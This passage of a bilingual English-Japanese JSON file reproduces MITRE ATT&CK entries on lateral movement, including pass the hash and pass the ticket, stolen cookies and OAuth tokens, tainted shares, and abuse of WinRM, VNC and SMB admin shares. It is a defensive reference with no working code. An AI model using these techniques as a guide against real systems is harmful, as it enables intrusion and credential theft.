場合によっては、攻撃者は、`&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf`で設定されているSeEnableDelegationPrivilegeなどの特定のユーザー権限を変更して、攻撃者の制御下にあるユーザーアカウントがGPOを変更できるようになるため、ドメインを完全に制御できる巧妙なADバックドアを実現する可能性があります。(引用: Harmj0y SeEnableDelegationPrivilege Right)"
                    }
                ]
            }
        ]
    },
    {
        "id": "TA0008",
        "name_eng": "Lateral Movement",
        "name_jp": "ラテラルムーブメント",
        "description_eng": "The adversary is trying to move through your environment.\n\nLateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier.",
        "description_jp": "攻撃者は環境内を移動しようとしています。\n\nラテラルムーブメントは、攻撃者がネットワーク上のリモートシステムに侵入し制御するために使用するテクニックで構成されます。主な目的を達成するためには、多くの場合、ネットワークを探索してターゲットを見つけ、その後アクセスする必要があります。目的を達成するためには、複数のシステムやアカウントを経由してアクセスすることがよくあります。攻撃者は、ラテラルムーブメントを達成するために独自のリモートアクセスツールをインストールしたり、正当な認証情報とネイティブのネットワークおよびオペレーティングシステムツールを使用したりすることがあり、これはよりステルス性が高い場合があります。",
        "techniques": [
            {
                "id": "T1080",
                "name_eng": "Taint Shared Content",
                "name_jp": "共有コンテンツの汚染",
                "description_eng": "Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)\n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
                "description_jp": "攻撃者は、ネットワークドライブや内部コードリポジトリなどの共有ストレージの場所にコンテンツを追加することにより、リモートシステムにペイロードを配信する可能性があります。ネットワークドライブやその他の共有場所に保存されているコンテンツは、悪意のあるプログラム、スクリプト、またはエクスプロイトコードを他の有効なファイルに追加することによって汚染される可能性があります。ユーザーが共有の汚染されたコンテンツを開くと、悪意のある部分が実行され、リモートシステムで攻撃者のコードが実行される可能性があります。攻撃者は、横方向に移動するために汚染された共有コンテンツを使用する可能性があります。\n\nディレクトリ共有ピボットは、ユーザーが共有ネットワークディレクトリにアクセスするときにマルウェアを伝播させるために他のいくつかのテクニックを使用するこのテクニックのバリエーションです。[隠しファイルとディレクトリ](https://attack.mitre.org/techniques/T1564/001)を介して非表示にされている実際のディレクトリのように見えるように[マスカレード](https://attack.mitre.org/techniques/T1036)を使用するディレクトリ.LNKファイルの[ショートカットの変更](https://attack.mitre.org/techniques/T1547/009)を使用します。悪意のある.LNKベースのディレクトリには、ディレクトリ内の隠しマルウェアファイルを実行し、ユーザーの期待されるアクションが引き続き発生するように実際の意図したディレクトリを開く埋め込みコマンドがあります。頻繁に使用されるネットワークディレクトリで使用すると、このテクニックにより、頻繁な再感染とシステムへの広範なアクセス、および潜在的に新しいより特権の高いアカウントへのアクセスが発生する可能性があります。(引用: Retwin Directory Share Pivot)\n\n攻撃者はまた、共有ネットワークディレクトリ上の正常なバイナリにコードを追加または先頭に追加することにより、バイナリ感染を介して共有ネットワークディレクトリを侵害する可能性があります。マルウェアは、正当なコードの前に実行されるように、正常なバイナリの元のエントリポイント（OEP）を変更する可能性があります。感染は、リモートシステムによって実行されると、新しく感染したファイルを介して広がり続ける可能性があります。これらの感染は、.EXE、.DLL、.SCR、.BAT、および/または.VBSを含むがこれらに限定されない拡張子で終わるバイナリ形式と非バイナリ形式の両方をターゲットにする可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1091",
                "name_eng": "Replication Through Removable Media",
                "name_jp": "リムーバブルメディアによる複製",
                "description_eng": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\n\nMobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",
                "description_jp": "攻撃者は、マルウェアをリムーバブルメディアにコピーし、メディアがシステムに挿入されて実行されるときに自動実行機能を利用することにより、切断されたネットワークやエアギャップネットワーク上のシステムに移動する可能性があります。ラテラルムーブメントの場合、これはリムーバブルメディアに保存されている実行可能ファイルの変更、またはマルウェアをコピーして正当なファイルのように名前を変更し、ユーザーを騙して別のシステムで実行させることによって発生する可能性があります。初期アクセスの場合、これはメディアの手動操作、メディアを最初にフォーマットするために使用されるシステムの変更、またはメディアのファームウェア自体の変更によって発生する可能性があります。\n\nモバイルデバイスは、USB経由で接続されている場合にPCをマルウェアに感染させるためにも使用される可能性があります。(引用: Exploiting Smartphone USB ) この感染は、デバイス（Android、iOSなど）を使用して達成でき、場合によってはUSB充電ケーブルも使用できます。(引用: Windows Malware Infecting Android)(引用: iPhone Charging Cable Hack) 例えば、スマートフォンがシステムに接続されると、USB接続ディスクドライブと同様にマウントされているように見える場合があります。接続されたシステムと互換性のあるマルウェアがモバイルデバイス上にある場合、マルウェアはマシンに感染する可能性があります（特に自動実行機能が有効になっている場合）。",
                "subtechniques": []
            },
            {
                "id": "T1550",
                "name_eng": "Use Alternate Authentication Material",
                "name_jp": "代替認証マテリアルの使用",
                "description_eng": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",
                "description_jp": "攻撃者は、パスワードハッシュ、Kerberosチケット、アプリケーションアクセストークンなどの代替認証マテリアルを使用して、環境内で横方向に移動し、通常のシステムアクセス制御をバイパスする可能性があります。\n\n認証プロセスでは通常、有効なID（ユーザー名など）と1つ以上の認証要素（パスワード、PIN、物理スマートカード、トークンジェネレーターなど）が必要です。代替認証マテリアルは、ユーザーまたはアプリケーションが有効なIDと必要な認証要素を提供して正常に認証された後、システムによって正当に生成されます。代替認証マテリアルは、ID作成プロセス中に生成されることもあります。(引用: NIST Authentication)(引用: NIST MFA)\n\n代替認証マテリアルをキャッシュすることにより、システムはユーザーに認証要素の再入力を求めることなく、IDが正常に認証されたことを確認できます。代替認証はシステムによってメモリまたはディスクに保持される必要があるため、[認証情報アクセス](https://attack.mitre.org/tactics/TA0006)テクニックによって盗まれるリスクがあります。代替認証マテリアルを盗むことにより、攻撃者はシステムアクセス制御をバイパスし、平文のパスワードや追加の認証要素を知らなくてもシステムに認証できます。",
                "subtechniques": [
                    {
                        "id": "T1550.004",
                        "name_eng": "Web Session Cookie",
                        "name_jp": "Webセッションクッキー",
                        "description_eng": "Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)\n\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\n\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)",
                        "description_jp": "攻撃者は、盗まれたセッションクッキーを使用してWebアプリケーションやサービスに認証できます。このテクニックは、セッションが既に認証されているため、一部の多要素認証プロトコルをバイパスします。(引用: Pass The Cookie)\n\n認証クッキーは、ユーザーがサービスに認証した後、資格情報が渡されたり再認証が頻繁に行われたりする必要がないように、クラウドベースのサービスを含むWebアプリケーションで一般的に使用されます。クッキーは、Webアプリケーションがアクティブに使用されていなくても、長期間有効であることがよくあります。[Webセッションクッキーの窃取](https://attack.mitre.org/techniques/T1539)または[Webクッキー](https://attack.mitre.org/techniques/T1606/001)を通じてクッキーを取得した後、攻撃者は制御下にあるブラウザにクッキーをインポートし、セッションクッキーがアクティブである限りユーザーとしてサイトまたはアプリケーションを使用できます。サイトにログインすると、攻撃者は機密情報にアクセスしたり、メールを読んだり、被害者アカウントが実行する権限を持つアクションを実行したりできます。\n\n多要素認証システムをバイパスするためにセッションクッキーを標的とするマルウェアの例があります。(引用: Unit 42 Mac Crypto Cookies January 2019)"
                    },
                    {
                        "id": "T1550.001",
                        "name_eng": "Application Access Token",
                        "name_jp": "アプリケーションアクセストークン",
                        "description_eng": "Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) \n\nOAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS Roles)\n\nDirect API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.(Citation: Crowdstrike AWS User Federation Persistence) Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",
                        "description_jp": "攻撃者は、盗まれたアプリケーションアクセストークンを使用して、通常の認証プロセスをバイパスし、リモートシステム上の制限されたアカウント、情報、またはサービスにアクセスする可能性があります。これらのトークンは通常、ユーザーまたはサービスから盗まれ、ログイン資格情報の代わりに使用されます。\n\nアプリケーションアクセストークンは、ユーザーまたはサービスに代わって承認されたAPIリクエストを行うために使用され、クラウド、コンテナベースのアプリケーション、およびSoftware-as-a-Service（SaaS）のリソースにアクセスするために一般的に使用されます。(引用: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)\n\nOAuthは、システムへのアクセス用にユーザーにトークンを発行する一般的に実装されているフレームワークの1つです。これらのフレームワークは、ユーザーを検証し、ユーザーが実行できるアクションを決定するために共同で使用されます。IDが確立されると、トークンはユーザーの実際の資格情報を渡すことなくアクションを承認できます。したがって、トークンの侵害により、攻撃者は悪意のあるアプリケーションを通じて他のサイトのリソースにアクセスできるようになる可能性があります。(引用: okta)\n\n例えば、クラウドベースの電子メールサービスでは、OAuthアクセストークンが悪意のあるアプリケーションに付与されると、バックグラウンドアクセスを可能にする「リフレッシュ」トークンが付与された場合、ユーザーアカウントの機能に長期間アクセスできる可能性があります。(引用: Microsoft Identity Platform Access 2019) OAuthアクセストークンを使用すると、攻撃者はユーザーが付与したREST APIを使用して、電子メールの検索や連絡先の列挙などの機能を実行できます。(引用: Staaldraad Phishing with OAuth 2017)\n\n侵害されたアクセストークンは、他のサービスを侵害するための最初のステップとして使用される場合があります。例えば、トークンが被害者の主要な電子メールへのアクセスを許可する場合、攻撃者はパスワード忘れルーチンをトリガーすることにより、ターゲットが購読している他のすべてのサービスへのアクセスを拡張できる可能性があります。AWSおよびGCP環境では、攻撃者は別のユーザーアカウントの権限を持つ短期間のアクセストークンのリクエストをトリガーできます。(引用: Google Cloud Service Account Credentials)(引用: AWS Temporary Security Credentials) その後、攻撃者はこのトークンを使用して、元のアカウントではできなかったデータの要求やアクションの実行を行うことができます。この機能の権限が誤って構成されている場合（例えば、すべてのユーザーが特定のアカウントのトークンを要求できるようにするなど）、攻撃者はクラウドアカウントへの初期アクセスを取得したり、権限を昇格させたりできる可能性があります。(引用: Rhino Security Labs Enumerating AWS Roles)\n\nトークンを介した直接APIアクセスは、第2認証要素の有効性を無効にし、パスワードの変更などの直感的な対策の影響を受けない可能性があります。例えば、AWS環境では、ユーザーのAWS API資格情報を侵害した攻撃者は、`sts:GetFederationToken` API呼び出しを使用してフェデレーションユーザーセッションを作成できます。これは元のユーザーと同じ権限を持ちますが、元のユーザー資格情報が無効化されても存続する可能性があります。(引用: Crowdstrike AWS User Federation Persistence) さらに、APIチャネルを介したアクセス乱用は、アクセスが正当なワークフローと依然としてよく整合している可能性があるため、サービスプロバイダー側からでも検出が困難な場合があります。"
                    },
                    {
                        "id": "T1550.003",
                        "name_eng": "Pass the Ticket",
                        "name_jp": "パスザチケット",
                        "description_eng": "Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)\n\nA [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)\n\nA [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",
                        "description_jp": "攻撃者は、盗まれたKerberosチケットを使用して「パスザチケット」を行い、環境内で横方向に移動し、通常のシステムアクセス制御をバイパスする可能性があります。パスザチケット（PtT）は、アカウントのパスワードにアクセスすることなくKerberosチケットを使用してシステムに認証する方法です。Kerberos認証は、リモートシステムへの横方向の移動の最初のステップとして使用できます。\n\nPtTを実行する場合、[有効なアカウント](https://attack.mitre.org/techniques/T1078)の有効なKerberosチケットは[OS資格情報ダンピング](https://attack.mitre.org/techniques/T1003)によってキャプチャされます。アクセスレベルに応じて、ユーザーのサービスチケットまたはチケット付与チケット（TGT）を取得できます。サービスチケットは特定のリソースへのアクセスを許可しますが、TGTはチケット付与サービス（TGS）からサービスチケットを要求して、ユーザーがアクセスする権限を持つ任意のリソースにアクセスするために使用できます。(引用: ADSecurity AD Kerberos Attacks)(引用: GentilKiwi Pass the Ticket)\n\n[シルバーチケット](https://attack.mitre.org/techniques/T1558/002)は、Kerberosを認証メカニズムとして使用するサービスに対して取得でき、その特定のリソースおよびそのリソースをホストするシステム（SharePointなど）にアクセスするためのチケットを生成するために使用されます。(引用: ADSecurity AD Kerberos Attacks)\n\n[ゴールデンチケット](https://attack.mitre.org/techniques/T1558/001)は、キー配布サービスアカウントKRBTGTアカウントNTLMハッシュを使用してドメインに対して取得でき、Active Directory内の任意のアカウントのTGTを生成できます。(引用: Campbell 2014)\n\n攻撃者はまた、盗まれたパスワードハッシュやAESキーなど、他のユーザー情報を使用して有効なKerberosチケットを作成する可能性があります。例えば、「オーバーパスザハッシュ」では、NTLMパスワードハッシュを使用してユーザーとして認証し（つまり[パスザハッシュ](https://attack.mitre.org/techniques/T1550/002)）、同時にパスワードハッシュを使用して有効なKerberosチケットを作成します。(引用: Stealthbits Overpass-the-Hash)"
                    },
                    {
                        "id": "T1550.002",
                        "name_eng": "Pass the Hash",
                        "name_jp": "パスザハッシュ",
                        "description_eng": "Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)",
                        "description_jp": "攻撃者は、盗まれたパスワードハッシュを使用して「パスザハッシュ」を行い、環境内で横方向に移動し、通常のシステムアクセス制御をバイパスする可能性があります。パスザハッシュ（PtH）は、ユーザーの平文パスワードにアクセスすることなくユーザーとして認証する方法です。この方法は、平文パスワードを必要とする標準的な認証ステップをバイパスし、パスワードハッシュを使用する認証の部分に直接移動します。\n\nPtHを実行する場合、使用されているアカウントの有効なパスワードハッシュは、[認証情報アクセス](https://attack.mitre.org/tactics/TA0006)テクニックを使用してキャプチャされます。キャプチャされたハッシュはPtHと共に使用され、そのユーザーとして認証されます。認証されると、PtHを使用してローカルまたはリモートシステムでアクションを実行できます。\n\n攻撃者はまた、盗まれたパスワードハッシュを使用して「オーバーパスザハッシュ」を行うこともあります。PtHと同様に、これにはパスワードハッシュを使用してユーザーとして認証することが含まれますが、パスワードハッシュを使用して有効なKerberosチケットも作成します。このチケットは、その後[パスザチケット](https://attack.mitre.org/techniques/T1550/003)攻撃を実行するために使用できます。(引用: Stealthbits Overpass-the-Hash)"
                    }
                ]
            },
            {
                "id": "T1021",
                "name_eng": "Remote Services",
                "name_jp": "リモートサービス",
                "description_eng": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services) They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain, or management platforms for internal virtualization environments such as VMware vCenter. \n\nLegitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands)",
                "description_jp": "攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して、telnet、SSH、VNCなどのリモート接続を受け入れるサービスにログインする可能性があります。その後、攻撃者はログオンしたユーザーとしてアクションを実行できます。\n\nエンタープライズ環境では、サーバーとワークステーションをドメインに編成できます。ドメインは集中型ID管理を提供し、ユーザーはネットワーク全体で1セットの資格情報を使用してログインできます。攻撃者が有効なドメイン資格情報のセットを取得できた場合、セキュアシェル（SSH）やリモートデスクトッププロトコル（RDP）などのリモートアクセスプロトコルを使用して多くの異なるマシンにログインできる可能性があります。(引用: SSH Secure Shell)(引用: TechNet Remote Desktop Services) また、IDをドメインにフェデレーションするSaaSまたはIaaSサービスや、VMware vCenterなどの内部仮想化環境の管理プラットフォームにもログインできる可能性があります。\n\n正当なアプリケーション（[ソフトウェア展開ツール](https://attack.mitre.org/techniques/T1072)やその他の管理プログラムなど）は、[リモートサービス](https://attack.mitre.org/techniques/T1021)を利用してリモートホストにアクセスする場合があります。例えば、macOSのApple Remote Desktop（ARD）は、リモート管理に使用されるネイティブソフトウェアです。ARDは、画面と制御バッファを送信するための[VNC](https://attack.mitre.org/techniques/T1021/005)や、安全なファイル転送のための[SSH](https://attack.mitre.org/techniques/T1021/004)など、プロトコルの組み合わせを利用します。(引用: Remote Management MDM macOS)(引用: Kickstart Apple Remote Desktop commands)(引用: Apple Remote Desktop Admin Guide 3.3) 攻撃者はARDなどのアプリケーションを悪用して、リモートコード実行を取得し、横方向の移動を実行する可能性があります。macOS 10.14より前のバージョンでは、攻撃者はSSHセッションをARDセッションにエスカレートでき、これにより攻撃者はユーザーの操作なしにTCC（透過性、同意、制御）プロンプトを受け入れ、データへのアクセスを取得できます。(引用: FireEye 2019 Apple Remote Desktop)(引用: Lockboxx ARD 2019)(引用: Kickstart Apple Remote Desktop commands)",
                "subtechniques": [
                    {
                        "id": "T1021.006",
                        "name_eng": "Windows Remote Management",
                        "name_jp": "Windows リモート管理",
                        "description_eng": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)",
                        "description_jp": "攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して、Windowsリモート管理（WinRM）を使用してリモートシステムと対話する可能性があります。その後、攻撃者はログオンしたユーザーとしてアクションを実行できます。\n\nWinRMは、ユーザーがリモートシステムと対話（実行ファイルの実行、レジストリの変更、サービスの変更など）できるようにするWindowsサービスとプロトコルの両方の名前です。(引用: Microsoft WinRM) `winrm`コマンドまたはPowerShellなどの多数のプログラムで呼び出すことができます。(引用: Jacobsen 2014) WinRMは、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)とリモートで対話する方法として使用できます。(引用: MSDN WMI)"
                    },
                    {
                        "id": "T1021.005",
                        "name_eng": "VNC",
                        "name_jp": "VNC",
                        "description_eng": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)",
                        "description_jp": "攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して、仮想ネットワークコンピューティング（VNC）を使用してマシンをリモート制御する可能性があります。VNCは、RFB（「リモートフレームバッファ」）プロトコルを使用して、ネットワーク経由で画面、マウス、キーボード入力を中継することにより、ユーザーが別のコンピュータのディスプレイをリモート制御できるようにするプラットフォーム非依存のデスクトップ共有システムです。(引用: The Remote Framebuffer Protocol)\n\nVNCは、リソース共有ソフトウェアではなく画面共有ソフトウェアであるため、[リモートデスクトッププロトコル](https://attack.mitre.org/techniques/T1021/001)とは異なります。デフォルトでは、VNCはシステムの認証を使用しますが、VNC固有の資格情報を使用するように構成することもできます。(引用: MacOS VNC software for Remote Desktop)(引用: VNC Authentication)\n\n攻撃者はVNCを悪用して、ドキュメントを開いたり、ファイルをダウンロードしたり、任意のコマンドを実行したりするなど、ログオンしたユーザーとして悪意のあるアクションを実行する可能性があります。攻撃者はVNCを使用してシステムをリモート制御および監視し、データを収集してネットワーク内の他のシステムにピボットするための情報を収集する可能性があります。特定のVNCライブラリ/実装も、ブルートフォース攻撃やメモリ使用量の悪用の影響を受けやすくなっています。(引用: Hijacking VNC)(引用: macOS root VNC login without authentication)(引用: VNC Vulnerabilities)(引用: Offensive Security VNC Authentication Check)(引用: Attacking VNC Servers PentestLab)(引用: Havana authentication bug)"
                    },
                    {
                        "id": "T1021.002",
                        "name_eng": "SMB/Windows Admin Shares",
                        "name_jp": "SMB/Windows管理共有",
                        "description_eng": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",
